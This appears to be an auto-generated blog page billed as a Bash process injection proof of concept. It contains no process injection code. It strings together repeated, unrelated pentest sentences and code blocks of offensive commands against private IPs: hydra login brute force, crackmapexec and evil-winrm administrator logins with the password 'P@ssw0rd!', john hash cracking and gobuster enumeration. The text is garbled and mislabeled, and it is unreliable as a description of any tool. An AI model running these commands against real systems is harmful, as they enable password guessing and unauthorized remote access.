---
TitleSEO: "Process Injection PoC in Bash | ZureFX"
TitlePost: "Process Injection PoC — Bash"
Author: "ZureFX"
Description: "A Bash script for process injection poc. Built for security research and automation."
Keywords: "fuzzer, python, powershell, parser, bash"
URL: "https://zurefx.github.io/scripting/script-process-injection-poc-898.html"
URL_IMAGES: ""
Date: "2025-11-14"
Tags: "Fuzzer, Python, PowerShell, Parser, Bash"
Section: "scripting"
Lang: "en"
main_img: "script-process-injection-poc-898"
Permalink: "/scripting/script-process-injection-poc-898.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

Authentication bypass was achieved through careful manipulation of the login mechanism. The database credentials were hardcoded in the application source code. Unconstrained delegation was enabled on the compromised machine.

Built with **Bash** for offensive security automation.

### Requirements

- Bash
- `smbexec`
- `psexec`
- `pwncat`

## Implementation

### Core Logic

The service was running without proper input validation, leading to injection vulnerabilities. The scheduled task ran with elevated privileges and could be abused for escalation.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.47.133.131 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
crackmapexec smb 10.93.105.148 -u administrator -p 'P@ssw0rd!' --shares
```

The scheduled task ran with elevated privileges and could be abused for escalation. Unconstrained delegation was enabled on the compromised machine.

### Helper Functions

Initial enumeration revealed several interesting open ports on the target. Initial enumeration revealed several interesting open ports on the target.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
gobuster dir -u http://10.51.122.185/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

## Usage

### Basic Usage

The service account had excessive permissions assigned in Active Directory. Command injection was possible through unsanitized user input in the search functionality.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
evil-winrm -i 10.103.237.82 -u administrator -p 'P@ssw0rd!'
```

### Advanced Options

The application stored sensitive credentials in an unencrypted configuration file. Post-exploitation enumeration revealed a path to domain administrator privileges. The service account had excessive permissions assigned in Active Directory.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.65.107.187 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

## Output

### Example Output

Post-exploitation enumeration revealed a path to domain administrator privileges. The service was running without proper input validation, leading to injection vulnerabilities.

```
[+] Scanning target...
[+] Found 9 results
[+] Done in 14.97s
```
